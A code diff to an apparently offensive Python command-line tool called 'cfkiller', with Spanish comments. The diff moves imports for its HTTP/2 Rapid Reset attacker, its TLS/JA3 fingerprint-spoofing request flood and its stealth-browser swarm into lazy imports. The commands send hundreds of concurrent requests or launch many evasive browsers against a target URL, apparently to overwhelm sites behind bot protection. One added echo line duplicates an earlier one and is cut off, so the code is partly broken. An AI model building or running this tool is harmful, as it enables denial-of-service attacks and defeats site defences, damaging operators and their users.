@@ -10,12 +10,9 @@ import asyncio
 import typer
 from typing import Optional
 from datetime import datetime
-import yaml
 
 # Importamos nuestros módulos élite
 from cfkiller.core.http2.rapid_reset import RapidResetAttacker
-from cfkiller.core.tls.utils_client import spoofed_request
-from cfkiller.core.browser.manager import BrowserPool
 # (próximamente: swarm, proxy manager, reporter, etc.)
 
 app = typer.Typer(
@@ -54,6 +51,8 @@ def spoof(
     concurrency: int = typer.Option(200, "--concurrency", "-c", help="Requests concurrentes"),
 ):
     """uTLS + JA3 spoofing real – Pasa como navegador 100% legítimo"""
+    # Import inside the command to avoid import errors if optional deps aren't installed
+    from cfkiller.core.tls.utils_client import spoofed_request
     typer.echo(f"[bold green]Iniciando {requests} requests con uTLS spoofing[/bold green]")
 
     async def worker():
@@ -79,10 +78,13 @@ def browser(
     """Ataque con navegadores reales (undetected-playwright + stealth)"""
     typer.echo(f"[bold magenta]Lanzando {browsers} navegadores reales contra {url}[/bold magenta]")
 
+    typer.echo(f"[bold magenta]Lanzando {browsers} navegadores reales contra {url}[...]")
+
     async def run():
+        # Lazy import so CLI help doesn't require playwright deps
+        from cfkiller.core.browser.manager import BrowserPool
         pool = BrowserPool(pool_size=browsers)
         await pool.start()
-
         start = datetime.now()
         while (datetime.now() - start).seconds < duration:
             await asyncio.gather(*[pool.visit(url) for _ in range(browsers // 10)])
